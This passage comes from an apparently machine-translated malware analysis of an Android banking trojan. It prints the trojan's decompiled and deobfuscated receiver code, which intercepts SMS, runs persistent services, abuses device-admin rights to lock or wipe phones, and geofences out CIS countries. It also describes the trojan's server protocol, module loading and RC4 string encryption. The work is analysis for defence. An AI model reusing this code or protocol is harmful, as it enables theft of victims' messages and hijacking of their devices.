class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.dYDbaxro"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.HvGIrpl"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.HnzCyZAKNVN"</span></span></span><span class="hljs-tag">/&gt;</span></span></code> </pre> <br>  In general, the malware does not use anything supernatural, it does not have any use of any 0-day on android.  Criminals need to get the victim to include one permission, and no more, then Malvar will do everything herself. <br><br>  Google would need to limit some of the API features for non-playlist apps. <br><br><h2>  Receiver </h2><br>  The code of this class is obfuscated, but this does not prevent to study it. <br><br><div class="spoiler">  <b class="spoiler_title">Obfuscated code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, Intent intent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i; C0005b bVar; String str; String sb; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f243g).contains(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f45aS) &amp;&amp; !<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo32b(context)) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo24a(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f46aT); C0005b bVar2 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); C0005b.m16a(context, <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-number"><span class="hljs-number">10000</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i2 = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i2 &lt; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec.length) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (VERSION.SDK_INT &gt;= <span class="hljs-number"><span class="hljs-number">26</span></span> &amp;&amp; !<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f346c.mo14b(context)) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo25a(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ppknbeydxzuwxxv.class.getName().equals(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2].getName())) { context.stopService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])); } bVar = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; str = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d; StringBuilder sb2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb2.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f90bK); sb2.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2]); sb = sb2.toString(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (lsbcgaldiywkd.class.getName().equals(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2].getName())) { context.startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])); bVar = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; str = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d; StringBuilder sb3 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb3.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f88bI); sb3.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2]); sb = sb3.toString(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> parseInt = Integer.parseInt(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f47aU)); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (parseInt &gt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) { context.startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])); bVar = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; str = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d; StringBuilder sb4 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb4.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f89bJ); sb4.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2]); sb = sb4.toString(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { i2++; } } bVar.mo24a(str, sb); i2++; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo23a(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d, context); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo22a(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f259w, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo33b(context, pzjzcxauihlf.class) ? <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f42aP : <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f39aM); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intent.getAction().equals(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f29aC)) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo20a(context, intent); } <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { i = Integer.parseInt(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f58af)); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> parseInt2 = Integer.parseInt(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f57ae)) + <span class="hljs-number"><span class="hljs-number">1</span></span>; i++; C0005b bVar3 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str2 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f57ae; StringBuilder sb5 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); sb5.append(<span class="hljs-string"><span class="hljs-string">""</span></span>); sb5.append(parseInt2); bVar3.mo22a(context, str2, sb5.toString()); C0005b bVar4 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str3 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f58af; StringBuilder sb6 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); sb6.append(<span class="hljs-string"><span class="hljs-string">""</span></span>); sb6.append(i); bVar4.mo22a(context, str3, sb6.toString()); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception e2) { e = e2; i = <span class="hljs-number"><span class="hljs-number">0</span></span>; C0005b bVar5 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str4 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f252p; StringBuilder sb7 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb7.append(<span class="hljs-string"><span class="hljs-string">"(pro8) | vvcy "</span></span>); sb7.append(e.toString()); sb7.append(<span class="hljs-string"><span class="hljs-string">"::endLog::"</span></span>); bVar5.mo31b(context, str4, sb7.toString()); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i &gt;= <span class="hljs-number"><span class="hljs-number">3</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i &gt;= <span class="hljs-number"><span class="hljs-number">3</span></span> &amp;&amp; !<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo46i(context) &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo48k(context) &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo33b(context, pzjzcxauihlf.class)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo33b(context, pzjzcxauihlf.class)) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo22a(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f12M, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f42aP); } Intent intent2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, lvhxcug.class); intent2.putExtra(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f87bH, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f42aP); intent2.addFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); intent2.addFlags(<span class="hljs-number"><span class="hljs-number">536870912</span></span>); intent2.addFlags(<span class="hljs-number"><span class="hljs-number">1073741824</span></span>); context.startActivity(intent2); C0005b bVar6 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str5 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f58af; StringBuilder sb8 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); sb8.append(<span class="hljs-string"><span class="hljs-string">""</span></span>); sb8.append(<span class="hljs-number"><span class="hljs-number">0</span></span>); bVar6.mo22a(context, str5, sb8.toString()); } } }</code> </pre> <br></div></div><br>  And now a little explanation on the code. <br><br>  Malvari settings are stored in the XML file, the file is located in the directory <i>/data/data/package_name/shared_prefs/Settings.xml</i> <br><br><ul><li>  public String ReadXML - method for reading settings </li><li>  public String SaveXML - method for saving settings </li><li>  public boolean DozeMode - Checks if Doze Mode is enabled </li><li>  public class Service_fa extends Service - Service for assembling the physical activity of the device (steps, shaking the phone, etc.) </li><li>  public class Service_server extends Service - Service for connecting to the server </li><li>  public class Service_event_loop extends Service - Service running in an infinite loop for performing some functions of a tool </li><li>  public void startOffDozeMode - request to disable Doze Mode </li><li>  public void startAlarm - Starting the receiver every 10 seconds </li><li>  public void interceptionSMS - Method for working with SMS perekhat </li><li>  public boolean isAccessibilityService - the method to check whether the Accesibility Service is enabled or not </li><li>  public boolean cis - a method that blocks the work of a Malvari in the countries of the CIS, namely: ua, ru, by, tj, uz, tm, az, am, kz, kg and md (abbreviated names of countries) </li></ul><br>  I tried to bring the obfuscated code above into a more readable and normal form: <br><br><div class="spoiler">  <b class="spoiler_title">Readable code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, Intent intent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Class[] arrayService = {Service_fa.class, Service_server.class, Service_event_loop.class}; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((!ReadXML(context, <span class="hljs-string"><span class="hljs-string">"kill"</span></span>).contains(<span class="hljs-string"><span class="hljs-string">"dead"</span></span>)) &amp;&amp; (!cis(context))) { startAlarm(context, <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-number"><span class="hljs-number">10000</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arrayService.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((Build.VERSION.SDK_INT &gt;= <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp;&amp; (!DozeMode(context))) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!isMyServiceRunning(context, arrayService[i])) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Service_fa.class.getName().equals(arrayService[i].getName())) { startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, arrayService[i])); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Integer.parseInt(ReadXML(context, <span class="hljs-string"><span class="hljs-string">"step"</span></span>)) &gt;= <span class="hljs-number"><span class="hljs-number">1</span></span>) { startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, arrayService[i])); } }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(Service_server.class.getName().equals(arrayService[i].getName())){ stopService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, arrayService[i])); } } } startOffDozeMode(context); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intent.getAction().equals(<span class="hljs-string"><span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span></span>)) { interceptionSMS(context, intent); <span class="hljs-comment"><span class="hljs-comment">//   } if (isAdminDevice(context)) { if ((getScreenBoolean(context)) &amp;&amp; (isAccessibilityServiceEnabled(context, srvSccessibility.class))) { if (isAccessibilityServiceEnabled(context, srvSccessibility.class)) { SaveXML(context, consts.autoClick, "1"); } Intent intent = new Intent(context, Admin.class); intent.putExtra("admin", "1"); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY); startActivity(intent); } } } public void interceptionSMS(Context context, Intent intent){ Bundle bundle = intent.getExtras(); if (bundle != null) { final Object[] pdus = (Object[]) bundle.get(consts.string_116); String number = ""; String text = ""; if (pdus != null) { for (Object aPdusObj : pdus) { SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) aPdusObj); number = smsMessage.getDisplayOriginatingAddress(); text += smsMessage.getDisplayMessageBody(); } SaveXML(context, "LogSMS", "Number: " + number + " Text: " + text + "::endLog::"); } } } }</span></span></code> </pre> <br></div></div><br>  So I think the code has become more understandable to many readers. <br><br>  Receiver has 3 triggering triggers, and this is when the device is restarted, SMS is received or Alarmon is launched. <br><br>  Receiver also launches 3 services: <br><br><ul><li>  Collection of physical activity of the device (Service_fa) </li><li>  Service to connect to the server (Service_server) </li><li>  Service running in infinite loop for executing some Malvar functions (Service_event_loop) </li></ul><br>  First of all, Service_fa is started and only after the device becomes active (if the owner of the phone walks and the phone shakes), start Service_server and Service_event_loop.  They are the main process of Malvari, this method can remove real devices from emulators and receivers, av and others. <br><br>  Receiver also launches the Doze Mode disconnect request and the administrator privilege confirmation request. <br><br>  Since the malware has administrator privileges, it cannot be removed from the device until the rights are removed. <br><br><h2>  Admin rights </h2><br>  Let's look at what opportunities we have thanks to the Admin Device. <br><br><pre> <code class="xml hljs"><span class="hljs-comment"><span class="hljs-comment">&lt;!-- ADMIN DEVICE XML --&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">device-admin</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:android</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:layout_width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"match_parent"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:layout_height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"match_parent"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-policies</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">force-lock</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">wipe-data</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-policies</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">device-admin</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  the force-lock element is responsible for the device screen lock rights, and wipe-data for deleting the DATA, CACHE, and all memory sections on the device (completely resetting it). <br><br><h2>  Service_fa </h2><br>  On it we will finish to consider Receiver, and we will consider other services.  A service that removes data from touch sensors using the SensorManager class, this service simply receives the activity data and saves it to an XML file. <br><br>  Thanks to this, the villains will get an activity history and make its analysis for screening out emulators and especially lazy users. <br><br><h2>  Service_server </h2><br>  This stream is created to communicate with the server, the data is transmitted to the server in an encrypted form using the RC4 encryption algorithm, encoding everything in base64 after it. <br><br>  When starting the service, the first request to the server looks like this: <br><br><pre> <code class="json hljs"> { <span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-string"><span class="hljs-string">"qoietjeoisfhjdfhk"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"idSettings"</span></span>:<span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-attr"><span class="hljs-attr">"number"</span></span>:<span class="hljs-string"><span class="hljs-string">"+79999999999"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statAdmin"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statProtect"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statScreen"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statAccessibilty"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statSMS"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statCards"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statBanks"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statMails"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"activeDevice"</span></span>:<span class="hljs-string"><span class="hljs-string">"53"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"timeWorking"</span></span>:<span class="hljs-string"><span class="hljs-string">"342"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statDownloadModule"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"batteryLevel"</span></span>:<span class="hljs-string"><span class="hljs-string">"78"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"locale"</span></span>:<span class="hljs-string"><span class="hljs-string">"fr"</span></span> }</code> </pre><br>  I sent the data sent to the server randomly, I think everything is clear by the name of the parameters, what is responsible for what, so we‚Äôll not stop at their analysis. <br>  Now we‚Äôll see what the server‚Äôs responses might be, the malware checks if the empty response returns, if it does, it starts looping through the server‚Äôs domain array in a loop and sends this request to each domain, and if the answer contains the string == "~ I ~", then Malware stops at this domain and starts working with it. <br><br>  We have decided on which domain we are working with, now we are looking at the rest of the answers. <br><br>  If Response == "|| youNeedMoreResources ||" is returned  then immediately a request is sent to the server to receive an additional Malvari module: <br>  <i>gate_url? action = getModule &amp; data = {"idbot": "qoietjeoisfhjdfhk"}</i> <br>  Go ahead, Response == "|| no ||" <br>  <i>sends a gate_url</i> request to the server <i>? action = registration &amp; data = JSON</i> : <br><pre> <code class="json hljs"> { <span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-string"><span class="hljs-string">"qoietjeoisfhjdfhk"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"android"</span></span>: Build.VERSION.RELEASE, <span class="hljs-attr"><span class="hljs-attr">"tag"</span></span>:<span class="hljs-string"><span class="hljs-string">"tag"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"country"</span></span>:<span class="hljs-string"><span class="hljs-string">"fr"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"operator"</span></span>:<span class="hljs-string"><span class="hljs-string">"Megafon"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"model"</span></span>:<span class="hljs-string"><span class="hljs-string">"Samsung Galaxy S9"</span></span> }</code> </pre> <br>  This request is used to register a new user in the admin panel, on this server requests are over. <br><br>  But below there is a condition that checks the presence of the file "system.apk". <br><br>  Obfuscated code: <br><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(getDir(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f301a.f215dd, <span class="hljs-number"><span class="hljs-number">0</span></span>), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f301a.f115bj).exists()){}</code> </pre> <br>  Simplified code: <br><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(getDir(<span class="hljs-string"><span class="hljs-string">"apk"</span></span>, Context.MODE_PRIVATE), <span class="hljs-string"><span class="hljs-string">"system.apk"</span></span>).exists()) {}</code> </pre> <br>  if the file is present, JSON is generated in the form: <pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:<span class="hljs-string"><span class="hljs-string">"updateSettingsAndCommands"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>:<span class="hljs-string"><span class="hljs-string">"data"</span></span> }</code> </pre> <br>  The response parameter transmits the response from the server, then json is transmitted to the method that is located in the ‚Äúsystem.apk‚Äù module, and it is executed using the DexClassLoader class. <br><br><h2>  Service_event_loop </h2><br>  This service runs in a loop and waits for the command to lock the device.  The device is locked in a loop using administrator rights. <br><br><pre> <code class="java hljs">DevicePolicyManager deviceManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); deviceManager.lockNow();</code> </pre> <br>  This service is able to disable administrator rights, apparently the author of Malvari decided to do this for the ‚Äúself-destruction‚Äù of Malvari, so as not to leave traces on the phone of the victims. <br><br><pre> <code class="java hljs"> ComponentName componentName = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ComponentName(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, DeviceAdmin.class); DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE); devicePolicyManager.removeActiveAdmin(componentName);</code> </pre> <br>  The cycle also has 2 work speeds, 1 second and 8 seconds, if the Accessibility Service is disabled, it works at the 1st second and asks to enable this service, simply opening the Activity and forcing it to enable special features, in practice we will consider it in detail. <br><br>  At the end of the cycle there is also an implementation like in Service_server, and specifically sending commands to the method that is inside the loaded module "system.apk", but the parameters are not much different, we look at JSON: <br><br><pre> <code class="json hljs"> { <span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:<span class="hljs-string"><span class="hljs-string">"serviceWorkingWhile"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"tick"</span></span>:<span class="hljs-string"><span class="hljs-string">"100"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"idbot"</span></span>:<span class="hljs-string"><span class="hljs-string">"qoietjeoisfhjdfhk"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"accessibility"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span> }</code> </pre> <br>  tick - seconds that the service cycle counts, accessibility - checks if the Accesibility Service is enabled. <br><br><h2>  Class string (s) </h2><br>  All strings inside the class are encrypted using the RC4 algorithm, and then encoded in base64. <br><br>  Example: <br><br>  encrypted string: yyshybiwijujYzdkZDdkMjRlYjJmYjU5Y2Qw <br>  where the first 12 characters of the straka are the decryption key of the RC4 algorithm <br>  Keys: yyshybiwijuj <br>  Encrypted text: YzdkZDdkMjRlYjJmYjU5Y2Qw <br><br>  Here is part of the class String (s) <br><br><pre> <code class="java hljs"> <span class="hljs-comment"><span class="hljs-comment">/* renamed from: A */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f0A = mo1a(<span class="hljs-string"><span class="hljs-string">"yyshybiwijujYzdkZDdkMjRlYjJmYjU5Y2Qw"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: B */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f1B = mo1a(<span class="hljs-string"><span class="hljs-string">"dfpzkejthefgZDA1NTUyNmJiYWU4M2ViMjhjMGJmNTYx"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: C */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f2C = mo1a(<span class="hljs-string"><span class="hljs-string">"ewpskxnrtsvaMTBkOWRmZDAxZTZjNjkxZjhiYzYyOA=="</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: D */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f3D = mo1a(<span class="hljs-string"><span class="hljs-string">"ugqxhrpujzmaYTgwZjQ0NjBhN2Y1YmM1MDhjZjdkZWEwYzljZGIxOWY4NDEy"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: E */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f4E = mo1a(<span class="hljs-string"><span class="hljs-string">"xlzrjjolkozwZTRjOGY5OTZjMTExMTgwYTE0ZGQ="</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: F */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span 